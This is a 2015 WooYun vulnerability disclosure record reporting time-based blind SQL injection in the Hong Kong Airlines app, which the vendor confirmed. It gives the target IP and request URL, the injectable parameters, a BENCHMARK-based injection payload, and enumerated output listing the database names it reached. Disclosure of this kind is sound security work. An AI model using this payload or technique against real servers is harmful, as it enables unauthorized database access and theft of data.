{"id": 71973, "wybug_id": "wooyun-2015-0150603", "wybug_title": "香港航空官网APP存在SQL注入（可跨68个库）", "wybug_corp": "香港航空", "wybug_author": "路人甲", "wybug_date": "2015-10-30 13:37", "wybug_open_date": "2015-12-14 15:36", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-14：\t细节向公众公开  简要描述： 航空安全之香港航空APP注入 详细说明：  目标：香港航空APP检测发现以下地方存在SQL注入：（注入参数为app_id和uid，皆为时间盲注）\nhttp://115.182.68.136:1984/?app_id=1&msg_id=0&device_info={\"app_id\":\"1\",\"app_name\":\"香港航空\",\"app_version\":\"3.2.1\",\"bssid\":\"00:00:00:00:00:00\",\"cellLocation\":\"[0,0,0,0,0]\",\"channel_name\":\"yyb\",\"device_name\":\"andorid\",\"imei\":\"A0000038000000\",\"imsi\":\"000000000000000\",\"mac_address\":\"00:00:00:00:00:00\",\"manufacturer\":\"android\",\"network_sub_type\":\"WIFI\",\"network_type\":\"WIFI\",\"os_version\":\"4.1.2\",\"phone_number\":\"000000000000000\",\"resolution\":\"1080*1920\",\"sdk_version\":\"16\",\"source\":\"NotificationService\",\"timestamp\":\"1446130794661\",\"uid\":\"NMAae6b5036b9e89a4eb72be5b2fc9fcc09\"}&type=check_and_post_msg&language=0\n估计是SQLMap对json语法支持不好，而且程序对sleep()睡眠时间不定，所以用SQLMap没跑出来；于是改用了BENCHMARK。Payload如下，直接加在注入参数之后即可，替换注入语句2>1为查询语句：\n' or 1=if((2>1,(select BENCHMARK(40000000,encode('hello','goodbye'))),(select BENCHMARK(1,encode('hello','goodbye')))) and 'a'='a\n   漏洞证明：  按照以上原理，写了个Python批量执行，从而取得数据：1、当前数据库用户\n\n2、当前数据库\n\n3、所有数据库，共68个，可跨库，此处只列出前55个\n\n==============================AMAVISDAPOINTMENTAPPBABYBAOBIAOBISHENGYUANBOSSDASHREPORTSDATABURGER_CMSECOMMERCEGROUPBUYHEALTHCHANNELHKSHARESHUASHIHUAZHUANGHUAZHUANG_BAOBIAOHUAZHUANG_DASHREPORTSHUAZHUANG_DWIMAGE_CUTIMSERVERINTERFACEIWEBMALLIWEBSHO_MADSERVERMADSERVER_YSZJMADSERVER_ZSYDMEDICINEMEDICINESHOPMUYINGBAOBIAOMY_WIKIMYSQLOPENFIREOPENFIRE2OPENSIPSOPENXORDERSYSTEMOUT_ADD_PUSHPHARMACIESPIWIKPOLICEMANPOLICYDPOSTFIXPROTALPUBLICINFORADIUSROUNDCUBEMAILSEARCHSEARCH_BUSSERVLETSSHOP_ITEMSIP_JABSMSSNSWEBBUSSOLRDATASPAMASSASSIN==================================4、跑下当前库SNSWEBBUS的表吧，只跑前三个~\n\n以此可跑出所有数据，不深入了~   修复方案：  请多指教~   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-10-30 15:35 厂商回复： 谢谢，我们将对漏洞进行修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-10-30 13:50 |    \t\t土夫子 \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | 你怎样看世界，世界就怎样看你)\t\t \n  66666    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}